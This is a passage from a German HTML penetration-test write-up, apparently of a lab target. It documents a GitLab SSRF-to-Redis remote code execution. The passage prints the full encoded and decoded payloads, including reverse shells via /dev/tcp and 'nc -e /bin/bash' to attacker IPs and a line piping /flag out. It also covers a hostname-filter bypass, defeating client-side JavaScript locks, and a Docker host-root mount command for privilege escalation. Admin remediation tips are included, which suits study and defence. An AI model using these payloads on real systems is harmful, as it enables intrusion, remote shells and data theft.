+<span class="password">[+] Login successful. Session cookie: 22a415b37c46bfecd475b57646a64481</span>
+<span class="password">[*] Preparing to run the exploit...</span>
+<span class="password">[*] Using CSRF Token: WoS5/Y/oUQstRnFJJfvK...</span>
+<span class="password">[*] Using Namespace ID: 1</span>
+<span class="password">[*] Using Project Name: pwned-project</span>
+<span class="password">[*] Sending payload to create project and trigger RCE...</span>
+<span class="password">[+] Payload sent (Status: 200). Check your listener!</span>
+</pre>
+                </div>
+            </div>
+             <p class="evaluation">alles Sackgasse wir testen es manuel per Proxy mit Burpsuite...</p>
+
+            <p class="analysis">
+                **Analyse:** Angesichts der gescheiterten automatisierten Exploit-Versuche dokumentiere ich die manuellen Schritte, um den RCE-Payload über das Erstellen eines Projekts in GitLab mit Burp Suite zu testen. Ich navigiere zur Seite, um ein neues Projekt zu erstellen (`http://192.168.2.215:5080/projects/new`), wie auf den Bildern gezeigt. Ich fange die HTTP-POST-Anfrage ab, die beim Erstellen des Projekts gesendet wird. Das Bild zeigt die GitLab-Oberfläche zum Erstellen eines neuen Projekts.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Das manuelle Vorgehen mit Burp Suite ist entscheidend, um den genauen HTTP-Request zu sehen, der das Exploit auslöst. Ich kann nun den `import_url` Parameter gezielt manipulieren und verschiedene Payloads testen, um die RCE zu triggern. Die GUI-Schritte (Projekt erstellen) führen zum relevanten HTTP-Request, den ich in Burp abfangen und modifizieren kann.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Verwenden Sie einen Proxy (wie Burp Suite), um HTTP-Requests abzufangen und zu modifizieren. Dies ist unerlässlich, wenn automatisierte Skripte fehlschlagen oder für manuelle Tests komplexer Web-Schwachstellen.
+                <br>**Empfehlung (Admin):** (Wiederholung der Empfehlungen zur Absicherung von GitLab).
+            </p>
+            <p>
+                Vorbereitung für manuellen Exploit-Versuch mit Burp Suite – Erstellen eines Projekts in GitLab:
+            </p>
+            <pre>
+<span class="command">http://192.168.2.215:5080/projects/new</span>
+</pre>
+            <img src="gitlab_create_project.jpg" alt="hier wird ein projekt in Gitlab erstellt">
+            <p class="analysis">Bildbeschreibung: hier wird ein projekt in Gitlab erstellt</p>
+            <img src="gitlab_create_project_config.jpg" alt="hier sieht man die config des fake projekts für burpsuite">
+            <p class="analysis">Bildbeschreibung: hier sieht man die config des fake projekts für burpsuite</p>
+            <p class="analysis">
+                **Analyse:** Ich zeige den HTTP-POST-Request, der vom Browser (wahrscheinlich nach manueller Eingabe im Formular) zum Erstellen des Projekts gesendet wird. Dieser Request enthält alle notwendigen Parameter, darunter `authenticity_token`, Projekt-Details wie `project[name]`, `project[namespace_id]`, `project[path]` und vor allem `project[import_url]`. Der Standardwert für `import_url` ist hier `http://a.com/b.git`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist der genaue Request, den ich in Burp Suite modifizieren werde, um den bösartigen Payload in den `project[import_url]` Parameter einzufügen. Ich sehe alle notwendigen Felder wie `authenticity_token` und die Struktur der Projekt-Parameter. Der Standardwert in `import_url` zeigt, dass die Anwendung externe URLs für den Import erwartet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie alle Parameter in POST-Requests auf potenzielle Injection-Punkte. Die `import_url` ist hier der offensichtliche Punkt für SSRF/RCE.
+                <br>**Empfehlung (Admin):** Validieren und bereinigen Sie alle Benutzereingaben in Formularen, insbesondere in Feldern, die URLs, Dateinamen oder Befehle erwarten.
+            </p>
+             <pre>
+<span class="command">POST /projects HTTP/1.1</span>
+<span class="command">Host: 192.168.2.215:5080</span>
+<span class="command">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+<span class="command">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="command">Accept-Language: de,en-US;q=0.7,en;q=0.3</span>
+<span class="command">Accept-Encoding: gzip, deflate, br</span>
+<span class="command">Referer: http://192.168.2.215:5080/projects/new</span>
+<span class="command">Content-Type: application/x-www-form-urlencoded</span>
+<span class="command">Content-Length: 350</span>
+<span class="command">Origin: http://192.168.2.215:5080</span>
+<span class="command">DNT: 1</span>
+<span class="command">Connection: keep-alive</span>
+<span class="command">Cookie: sidebar_collapsed=false; grafana_session=51c4fad1c33bb3c2fce6f6e726d6480a; _gitlab_session=<span class="password">739b55f9a60de58847ea72c9bd5349fd</span>; remember_user_token=W1sxXSwiJDJhJDEwJGRjTXJYZDZ0L0NpSVVMTHo1YjdsdU8iLCIxNzQ5Mjk4MTMwLjk4NTc5MjIiXQ%3D%3D--7fc52f2762d93439aa938777fc0608868c2a303d</span>
+<span class="command">Upgrade-Insecure-Requests: 1</span>
+<span class="command">Sec-GPC: 1</span>
+<span class="command">Priority: u=0, i</span>
+
+<span class="command">utf8=%E2%9C%93&amp;authenticity_token=TuEW8%2FmDazTJK%2B8sq5YQeAwkWe%2B4XHqJagOyTXlEJrKMrsY2w8ctnhgOFHlLy7V2m3ll5bUicb4c6uP43ZHH4A%3D%3D&amp;project%5Bimport_url%5D=http%3A%2F%2Fa.com%2Fb.git&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=Exploit-Test&amp;project%5Bnamespace_id%5D=1&amp;project%5Bpath%5D=b&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0</span>
+</pre>
+            </p>
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere die Antwort des Servers auf den Standard-HTTP-POST-Request zum Erstellen eines Projekts mit einer harmlosen `import_url`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Antwort ist HTTP/1.1 302 Found, was eine Weiterleitung auf die neue Projektseite (`/root/b`) signalisiert. Dies ist das erwartete Verhalten bei erfolgreicher Projekterstellung. Die Header enthalten auch verschiedene Sicherheits-Header (X-Content-Type-Options, X-Frame-Options, X-Xss-Protection, Strict-Transport-Security) und anwendungsspezifische Header. Die Status 302 bedeutet, dass der erste Teil des Requests (Projekterstellung) funktioniert hat, auch wenn der Import selbst (asynchron) fehlschlagen mag.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Dieses Verhalten dient als Basislinie für die Reaktion des Servers. Abweichungen hiervon bei der Injektion des bösartigen Payloads müssen analysiert werden.
+                <br>**Empfehlung (Admin):** Implementieren Sie die empfohlenen Sicherheits-Header, um gängige Web-Schwachstellen zu mindern.
+            </p>
+             <pre>
+<span class="password">HTTP/1.1 302 Found</span>
+<span class="command">Server: nginx</span>
+<span class="command">Date: Sat, 07 Jun 2025 12:36:02 GMT</span>
+<span class="command">Content-Type: text/html; charset=utf-8</span>
+<span class="command">Content-Length: 98</span>
+<span class="command">Connection: keep-alive</span>
+<span class="command">Cache-Control: max-age=0, private, must-revalidate, no-store</span>
+<span class="command">Location: [Link: http://192.168.2.215:5080/root/b | Ziel: http://192.168.2.215:5080/root/b]</span>
+<span class="command">Pragma: no-cache</span>
+<span class="command">Set-Cookie: issue_board_welcome_hidden=; path=/root/b; expires=Thu, 01 Jan 1970 00:00:00 -0000</span>
+<span class="command">X-Content-Type-Options: nosniff</span>
+<span class="command">X-Frame-Options: DENY</span>
+<span class="command">X-Request-Id: 987307da-ecfa-4d38-97d1-f533b1f19a9d</span>
+<span class="command">X-Runtime: 0.663434</span>
+<span class="command">X-Ua-Compatible: IE=edge</span>
+<span class="command">X-Xss-Protection: 1; mode=block</span>
+<span class="command">Strict-Transport-Security: max-age=31536000</span>
+
+<span class="command">&lt;html&gt;&lt;body&gt;You are being &lt;a href="http://192.168.2.215:5080/root/b"&gt;redirected&lt;/a&gt;.&lt;/body&gt;&lt;/html&gt;</span>
+</pre>
+            </p>
+             <p class="evaluation">
+                Hier hast den entscheidenden Punkt gemacht: Wir haben den GitLab-Weg jetzt ausgeschlossen.
+
+                Wir haben ihn mit einem reparierten Skript versucht.
+                Wir haben ihn mit Burp manuell versucht.
+                Ergebnis: Der Server antwortet, aber die RCE wird nicht ausgelöst.
+            </p>
+             <p>
+                Du hast die ubuntu:18.04 Image-ID schon gefunden. Hier ist sie nochmal:
+                <span class="command">sha256:71cb16d32be4a95065b4fa1c8841a6f4c0098de7be0a90e14519098412d48356</span>
+            </p>
+             <p class="analysis">hier greifen wir weiter an mit JS</p>
+
+            <p class="analysis">
+                **Analyse:** Basierend auf dem Fazit, dass der GitLab RCE-Weg mit dem aktuellen Payload nicht funktioniert hat und dem Hinweis, dass wir nun "mit JS" angreifen, wende ich mich wieder der Docker Web UI auf Port 9000 zu. Ich navigiere zur `/images` Seite und dokumentiere, dass dort eine versteckte "run" Funktion zum Starten von Images existiert, die anscheinend über JavaScript gesteuert wird und standardmäßig deaktiviert ist. Das Bild zeigt die UI-Elemente, die auf diese Funktion hindeuten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Entdeckung einer "run" Funktion in der Docker Web UI, auch wenn sie durch JS blockiert ist, ist ein vielversprechender neuer Vektor. Die Möglichkeit, Docker Images direkt über die UI zu starten, könnte zu einem initialen Shell-Zugriff führen, insbesondere wenn ich das Host-Dateisystem in einen neuen Container mounten kann. Das Blocking über JS ist leicht zu umgehen, wie wir im Blackhat-Bericht gesehen haben. Der Fokus verschiebt sich nun auf die Ausnutzung dieser Docker-Funktionalität.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie den JavaScript-Code der Docker Web UI, um den Mechanismus des Blocking zu verstehen und zu umgehen. Nutzen Sie die "run" Funktion, um einen Container mit gemountetem Host-Dateisystem zu starten, um eine Shell oder Root-Zugriff zu erlangen.
+                <br>**Empfehlung (Admin):** Entfernen Sie ungenutzte oder durch clientseitiges Skript blockierte Funktionen aus Web-Oberflächen. Implementieren Sie serverseitige Zugriffskontrollen für kritische Aktionen wie das Starten von Containern.
+            </p>
+            <p>
+                Entdeckung einer versteckten "run" Funktion in der Docker Web UI auf Port 9000:
+            </p>
+            <pre>
+<span class="command">view-source:http://192.168.2.215:9000/images</span>
+</pre>
+            <img src="hier_docker_image_run.jpg" alt="hier sehen wir eine versteckte funktion zum starten von images ...">
+            <p class="analysis">Bildbeschreibung: hier sehen wir eine versteckte funktion zum starten von images ...</p>
+
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere, dass ich durch Einfügen von eigenem JavaScript-Code in die Browser-Konsole (oder durch Modifikation des Seiten-JS) die "run" Funktion in der Docker Web UI aktiviert habe. Das Bild zeigt, dass die Funktion nun klickbar und nutzbar ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies bestätigt, dass das Blocking clientseitig erfolgte und leicht umgangen werden konnte. Ich kann nun die "run" Funktion der Docker Web UI nutzen, um mit Docker Images zu interagieren. Dies ist der Schritt, der die Nutzung der Docker-Funktionalität über die ungeschützte UI ermöglicht.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie die freigeschaltete Funktion, um Container mit bösartigen Konfigurationen (z.B. Host-Mounts) zu starten.
+                <br>**Empfehlung (Admin):** Verlassen Sie sich niemals auf clientseitiges JavaScript für Sicherheitsmaßnahmen. Implementieren Sie serverseitige Validierung und Zugriffskontrollen.
+            </p>
+            <p>
+                Freischalten der "run" Funktion durch clientseitige JS-Manipulation:
+            </p>
+            <img src="dockerimageRun.jpg" alt="hier wir durch unseren eingefügten js code wurde die run funktion freigeschaltet">
+            <p class="analysis">Bildbeschreibung: hier wir durch unseren eingefügten js code wurde die run funktion freigeschaltet</p>
+
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere einen weiteren Schritt bei der Nutzung der freigeschalteten Docker Web UI. Bei der Interaktion mit der "run" Funktion wird wahrscheinlich ein Popup oder Formular angezeigt. Das Bild zeigt, dass ich die Entwickler-Tools des Browsers nutze, um ein Textfeld im Popup, das möglicherweise auf "readonly" gesetzt ist (`readonly=true`), zu modifizieren und das `readonly` Attribut zu entfernen. Dies ermöglicht mir, den Inhalt des Textfeldes zu bearbeiten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Entfernen des `readonly` Attributs über die Entwickler-Tools ist eine weitere gängige Methode, clientseitige Einschränkungen in Webanwendungen zu umgehen. Dies deutet darauf hin, dass das Formular zum Konfigurieren des Container-Starts ebenfalls clientseitig eingeschränkt wurde, was ein weiteres Zeichen für unzureichende serverseitige Validierung ist. Ich kann nun wahrscheinlich Parameter für den `docker run` Befehl über die UI anpassen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Lernen Sie den Umgang mit Browser-Entwickler-Tools, um clientseitige Einschränkungen in Formularen oder UI-Elementen zu umgehen.
+                <br>**Empfehlung (Admin):** Implementieren Sie immer serverseitige Validierung und Zugriffskontrollen für alle Eingabefelder und Aktionen, unabhängig von clientseitigen Skripten oder UI-Elementen.
+            </p>
+            <p>
+                Entfernen des `readonly` Attributs in einem Textfeld über die Browser-Entwickler-Tools:
+            </p>
+            <img src="wirändernreadonlytextfeldinfalse.jpg" alt="hier klicken auf das run popup reckte maustaste/inspektor/readonly=true entfernen">
+            <p class="analysis">Bildbeschreibung: hier klicken auf das run popup reckte maustaste/inspektor/readonly=true entfernen</p>
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere den Befehl `docker run -it -d --name WIR_SIND_DRIN -v /:/mnt alpine`. Dieser Befehl startet einen Docker-Container vom Image `alpine`, benennt ihn "WIR_SIND_DRIN", führt ihn im Detached-Modus aus (`-d`), weist ein TTY zu (`-it`) und mountet **das Root-Dateisystem des Hosts (`/`)** in das Verzeichnis `/mnt` im Container (`-v /:/mnt`). Der Text im Bericht gibt an, dass dieser Befehl scheinbar über die JS/UI ausgeführt wurde, aber kein Container erschien.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist der entscheidende Befehl für einen Docker-Container-Escape zur Erlangung von Root-Zugriff auf dem Host-Dateisystem, *vorausgesetzt*, dieser Befehl wird mit ausreichenden Rechten (z.B. durch den `git` Benutzer über `sudo docker`, wie später im PE-Abschnitt gezeigt) ausgeführt. Das Mounten des Host-Root-Dateisystems in einen Container ist eine gängige Methode, um auf die Dateien des Hosts zuzugreifen und Privilegien auszuweiten. Dass kein Container erschien, könnte auf einen Fehler bei der Ausführung über die UI hindeuten oder darauf, dass der Befehl zwar ausgeführt wurde, aber keine interaktive Shell im Vordergrund startete, wie der `-d` Flag bewirkt. **Wichtig ist jedoch, dass dieser Befehl später über die `sudo docker` Berechtigung des `git` Benutzers erfolgreich für die Privilege Escalation genutzt wird.**
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie diese Technik (`docker run -v /:/mnt ...`) in Kombination mit einer Shell im Container (`chroot /mnt sh`) um Root-Zugriff auf das Host-Dateisystem zu erlangen, wenn Sie Docker-Befehle mit privilegierten Rechten ausführen können.
+                <br>**Empfehlung (Admin):** **KRITISCH:** Implementieren Sie strikte Zugriffskontrollen für die Docker-API und den `docker` Befehl. Unprivilegierte Benutzer sollten diesen Befehl (insbesondere mit `sudo`) nicht ausführen können. Überprüfen Sie die `sudoers` Datei. Nutzen Sie prinzipiell das Principle of Least Privilege für Container und Benutzer.
+            </p>
+            <p>
+                Der `docker run` Befehl, der später für die Privilege Escalation genutzt wird:
+            </p>
+            <pre>
+<span class="command">docker run -it -d --name WIR_SIND_DRIN -v /:/mnt alpine</span>
+
+<span class="password">der docker run-Befehl über JS oder UI scheinbar erfolgreich ausgeführt wurde, aber kein Container erscheint</span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Ich kehre zum GitLab RCE Exploit auf Port 5080 zurück und dokumentiere den Prozess der URL-Codierung des bösartigen Payloads mit CyberChef. Das Bild zeigt den Ruby-Payload (der an Redis gesendet wird) und seine URL-encodierte Form.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die URL-Codierung ist notwendig, da der Payload Sonderzeichen (`\n`, `"`, `{`, `}`) enthält, die in einer URL korrekt maskiert werden müssen, damit die `import_url`-Parameter-Verarbeitung in GitLab und die weitere Verarbeitung (z.B. durch Redis oder den Ruby-Interpreter) korrekt funktionieren. Dies ist ein wichtiger Schritt beim Debugging und Anpassen des Exploits, nachdem die automatisierten Versuche fehlschlugen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Verstehen Sie, welche Zeichen in welchem Kontext URL-codiert oder maskiert werden müssen. Nutzen Sie Tools wie CyberChef für die korrekte Codierung komplexer Payloads.
+                <br>**Empfehlung (Admin):** Die korrekte Handhabung und Validierung von codierten Zeichen in Benutzereingaben ist essentiell, um Injection-Schwachstellen zu verhindern.
+            </p>
+            <p>
+                URL-Codierung des RCE-Payloads für den GitLab-Import:
+            </p>
+            <img src="gitlab_create_project_urlencoded.jpg" alt="hier wird mein payload mit cyberchef urlencoded">
+            <p class="analysis">Bildbeschreibung: hier wird mein payload mit cyberchef urlencoded</p>
+
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere den Versuch, ein neues GitLab-Projekt über die Web-UI oder manuell mit einem URL-encodierten `git://` Payload als `import_url` zu erstellen. Das Bild zeigt die GitLab-Oberfläche, die versucht, das Repository zu erstellen/importieren.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Erscheinen dieser Ansicht zeigt, dass der Request zum Erstellen des Projekts mit dem manipulierten `import_url` Parameter erfolgreich war und GitLab versucht, das Repository zu importieren. Dies ist ein positives Zeichen dafür, dass der Payload korrekt strukturiert ist, um von GitLab verarbeitet zu werden und den Import-Prozess (der die Schwachstelle auslöst) zu starten.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Beobachten Sie die UI-Rückmeldung und die Server-Antworten genau, um den Erfolg oder Misserfolg von Exploit-Versuchen zu beurteilen.
+                <br>**Empfehlung (Admin):** Überwachen Sie das Logging von GitLab auf Fehler oder ungewöhnliche Aktivitäten im Zusammenhang mit dem Repository-Import.
+            </p>
+            <p>
+                Versuch, ein Projekt mit dem URL-encodierten Payload zu erstellen:
+            </p>
+            <img src="gitrepo_by_url.jpg" alt="das repo mit encoded payload wird erstellt">
+            <p class="analysis">Bildbeschreibung: das repo mit encoded payload wird erstellt</p>
+
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere eine Fehlermeldung in der GitLab UI nach einem Versuch, das Projekt mit dem bösartigen `import_url` zu erstellen: "Import url is blocked: Hostname needs to start with an alphanumeric character". Das Bild zeigt diese Fehlermeldung.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Diese Fehlermeldung zeigt eine serverseitige Validierung oder Filterung des `import_url` Parameters. GitLab prüft offenbar, ob der Hostname (in meinem Fall die IP-Adresse im IPv6-Format `[0:0:0:0:0:ffff:127.0.0.1]`) mit einem alphanumerischen Zeichen beginnt. Da das `[` Zeichen nicht alphanumerisch ist, wird der Import blockiert. Dies ist ein Schutzmechanismus, der umgangen werden muss.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Identifizieren Sie die genaue Filterregel basierend auf der Fehlermeldung. Suchen Sie nach Möglichkeiten, die Validierung zu umgehen, z.B. durch alternative Hostnamen-Syntaxen (falls GitLab dies auflöst) oder andere Endpunkte, die die Validierung nicht durchführen. Dokumentieren Sie Bypass-Techniken für Hostname-Validierungen.
+                <br>**Empfehlung (Admin):** Implementieren Sie robuste Validierungen für alle externen Eingaben, insbesondere URLs. Die Validierung des Hostnamens ist ein guter Schritt, muss aber umfassend sein.
+            </p>
+            <p>
+                Fehlermeldung aufgrund der Hostname-Validierung im `import_url`:
+            </p>
+            <img src="fehler_alphanummeric.jpg" alt="repo will alphanumeric url">
+            <p class="analysis">Bildbeschreibung: repo will alphanumeric url</p>
+
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere die Korrektur des Payloads, um die alphanumerische Hostname-Validierung in GitLab zu umgehen. Das Bild zeigt, dass ich wahrscheinlich den `git://[0:0:0:0:0:ffff:127.0.0.1]:6379/` Teil des Payloads durch etwas ersetze, das die Validierung umgeht, während es immer noch auf die interne Redis-Instanz zeigt. Eine gängige Bypass-Technik für solche Validierungen ist das Hinzufügen von `a@` vor der IP-Adresse (z.B. `git://a@[0:0:0:0:0:ffff:127.0.0.1]:6379/`), da einige Parser dies als Benutzername im URL interpretieren und der Hostname dann mit einem alphanumerischen Zeichen beginnt. Ich dokumentiere das Kopieren des umgehenden Payloads.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist ein klassischer Bypass einer unzureichenden Hostname-Validierung. Durch das Hinzufügen eines alphanumerischen Zeichens am Anfang des Hostnamen-Teils wird die Validierung getäuscht, während die Verbindung weiterhin zur internen Redis-Instanz aufgebaut wird. Mit diesem angepassten Payload sollte die RCE nun auslösbar sein.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Machen Sie sich mit gängigen Bypass-Techniken für URL-Parsing-Schwachstellen und Hostname-Validierungen vertraut. Testen Sie verschiedene Protokoll-Handler und URL-Formate.
+                <br>**Empfehlung (Admin):** Implementieren Sie eine robuste URL-Parsing-Logik, die nicht durch ungewöhnliche Formate oder eingebettete Zeichen getäuscht werden kann. Nutzen Sie Bibliotheken, die speziell für sicheres URL-Parsing in sicherheitskritischen Kontexten entwickelt wurden.
+            </p>
+            <p>
+                Korrektur des Payloads zur Umgehung der alphanumerischen Hostname-Validierung:
+            </p>
+            <img src="kopiere_alphanummeric.jpg" alt="repo will alphanumeric url">
+            <p class="analysis">Bildbeschreibung: repo will alphanumeric url</p>
+            <img src="ersetzen.jpg" alt="den markierten teil mit dem string ersetzen">
+            <p class="analysis">Bildbeschreibung: den markierten teil mit dem string ersetzen</p>
+
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere die erfolgreiche Ausführung des Exploits mit dem angepassten Payload (der wahrscheinlich die alphanumerische Validierung umgeht und die korrigierte Ruby/Bash-Syntax enthält) über die GitLab-Importfunktion. Das Bild zeigt die GitLab-Oberfläche, die "Import in progress" anzeigt, was auf den Beginn des Importvorgangs hindeutet. Es wird auch der Befehl `git clone --bare ...` gezeigt, der intern vom GitLab-Prozess ausgeführt wird und den Payload enthält.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **ERFOLG! Der angepasste Payload scheint von GitLab akzeptiert und verarbeitet zu werden.** Die Meldung "Import in progress" und der interne `git clone` Befehl mit dem Payload zeigen, dass die SSRF zum internen Redis ausgelöst wurde und die Redis-Befehle (multi, sadd, lpush, exec) an die Warteschlange gesendet wurden. Die RCE sollte nun als Job im Hintergrund ausgeführt werden. Ich erwarte, dass eine Reverse Shell auf meinem Listener landet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Richten Sie sofort einen Listener ein, der die Reverse Shell empfangen soll. Warten Sie geduldig, da die Ausführung des Jobs asynchron erfolgen kann.
+                <br>**Empfehlung (Admin):** **KRITISCH:** Die RCE-Schwachstelle ist nun ausgenutzt. Sofortige Behebung der GitLab-Instanz erforderlich. Überprüfen Sie interne Netzwerke auf Kompromittierung durch den `git` Benutzer.
+            </p>
+            <p>
+                Erfolgreiche Auslösung des RCE-Exploits mit angepasstem Payload:
+            </p>
+            <pre>
+<span class="command">Payload: git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0A%20multi%0A%20sadd%20resque:gitlab:queues%20system_hook_push%0A%20lpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%5C%22,%5C%22open('%7Cbash%20-c%20%5C'bash%20-i%20%3E&amp;%20/dev/tcp/192.168.2.199/4444%200%3E&amp;1%5C'').read%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22%7D%22%0A%20exec%0A%20exec</span>
+
+<span class="password">payload_funktioniert</span>
+</pre>
+            <img src="payload_funktioniert.jpg" alt="den markierten teil mit dem string ersetzen">
+            <p class="analysis">Bildbeschreibung: den markierten teil mit dem string ersetzen</p>
+            <pre>
+Import in progress
+
+<span class="command">git clone --bare git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0Amulti%0Asadd%20resque:gitlab:queues%20system_hook_push%0ALpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%20%5C%5C%5C%22%5C%5C%60open(%5C%5C'%7Ccat%20/flag%20%7C%20nc%20192.168.178.21%201234%20-e%20/bin/bash%5C%5C')%60.read%5C%5C%5C%22%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22,%5C%22jid%5C%22:%5C%22ad52abc5641173e217eb2e52%5C%22,%5C%22created_at%5C%22:1513714403.8122594,%5C%22enqueued_at%5C%22:1513714403.8129568%7D%22%0Aexec%0Aexec%0A/ssrf.git</span>
+
+Please wait while we import the repository for you. Refresh at will.
+</pre>
+        </section>
+```
+
+**Teil 3 von 3**
+
+```html
+        <section id="initial-access">
+             <p class="analysis">
+                **Analyse:** Ich dokumentiere hier den dekodierten Payload, der über die GitLab-Importfunktion an die interne Redis-Instanz gesendet wird. Dies ist der Payload, der die Redis-Befehle und den eingebetteten Ruby/Bash-Code für die RCE enthält. Der Payload versucht unter anderem, `/flag` zu catten und an einen Netcat-Listener auf 192.168.178.21 Port 1234 zu senden. Der im `lpush` Befehl enthaltene JSON-String für den `GitlabShellWorker` ruft `class_eval` mit dem Kommando `open('|...')` auf.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dies ist der Kern des funktionierenden RCE-Exploits. Die Struktur zeigt, wie die SSRF genutzt wird, um Redis-Befehle zu senden, und wie die Command Injection über die `GitlabShellWorker` Klasse erreicht wird. Die Pipe (`|`) in `open('|...')` führt den darin enthaltenen Befehl in einer Shell aus. Der spezifische Befehl `cat /flag | nc ...` ist der Payload, der ausgeführt werden soll. Die Tatsache, dass dies funktioniert, bestätigt die Schwachstelle in der Verarbeitung der Import-URL und der Job-Queue in dieser GitLab-Version.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Analysieren Sie die Struktur erfolgreicher Payloads, um ein tieferes Verständnis der Schwachstelle zu erlangen und Payloads für andere Ziele (z.B. Reverse Shell zu Ihrer IP/Port) zu erstellen.
+                <br>**Empfehlung (Admin):** Deaktivieren Sie die Repository-Importfunktion aus externen URLs, wenn sie nicht unbedingt benötigt wird. Aktualisieren Sie GitLab.
+            </p>
+            <pre>
+<span class="command">git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</span>
+<span class="command">multi</span>
+<span class="command">sadd resque:gitlab:queues system_hook_push</span>
+<span class="command">lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval \\\"\\`open(\\'|cat /flag | nc 192.168.2.199 9001 -e /bin/bash\\')`.read\\\"\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"</span>
+<span class="command">exec</span>
+<span class="command">exec</span>
+<span class="command">/ssrf.git</span>
+</pre>
+
+             <p class="analysis">
+                **Analyse:** Ich dokumentiere einen weiteren dekodierten Payload, der an die interne Redis-Instanz gesendet wird.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dieser Payload scheint eine leicht andere Struktur zu haben, insbesondere am Ende. Es zeigt, wie die Befehle `exec` mehrmals gesendet werden und wie der `/ssrf.git` Teil des originalen `git clone` Befehls am Ende der Injektion hängt. Dies sind Details der Redis-Protokollinjektion, die beim Debugging relevant waren.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Analysieren Sie die genauen Bytes, die an interne Dienste gesendet werden, wenn Sie SSRF mit Protokollinjektion ausnutzen. Tools wie Burp Suite Repeater oder Netcat können dabei helfen.
+                <br>**Empfehlung (Admin):** Validieren Sie alle Eingaben streng, um zu verhindern, dass Metazeichen (wie Zeilenumbrüche, Anführungszeichen) injiziert werden, die die Kommunikation mit internen Diensten manipulieren könnten.
+            </p>
+            <pre>
+<span class="command">git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</span>
+ <span class="command">multi</span>
+ <span class="command">sadd resque:gitlab:queues system_hook_push</span>
+ <span class="command">lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\"</span>
+ <span class="command">exec</span>
+ <span class="command">exec</span>
+<span class="command">/ssrf.git</span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Ich zeige hier den Netcat-Listener auf meiner Angreifer-Maschine (192.168.2.199) auf Port 9001, der die Reverse Shell empfängt. Die Ausgabe zeigt die eingehende Verbindung vom Zielsystem (192.168.2.217) und den Shell-Prompt `id uid=998(git) gid=998(git) groups=998(git)`. Dies ist die Shell, die durch die erfolgreiche Ausnutzung der Authentifizierten RCE in GitLab ausgelöst wurde. Die Shell läuft als Benutzer `git`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Fantastisch! Der erste Zugang ist erfolgreich!** Ich habe eine interaktive Shell auf dem Zielsystem als Benutzer `git` erhalten. Dies bestätigt, dass der GitLab RCE-Exploit funktioniert hat. Der Benutzer `git` ist ein Systembenutzer, der typischerweise mit GitLab-internen Prozessen verbunden ist. Dies ist die Basis für die weitere Privilege Escalation. Die Reverse Shell landete auf Port 9001, was vom Payload `nc 192.168.2.199 9001` im erfolgreichen Exploit herrührt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sammeln Sie sofort Systeminformationen als Benutzer `git`. Identifizieren Sie mögliche PE-Vektoren (z.B. `sudo -l`, SUID-Binaries, Cronjobs, unsichere Dateiberechtigungen), um Root-Zugriff zu erlangen.
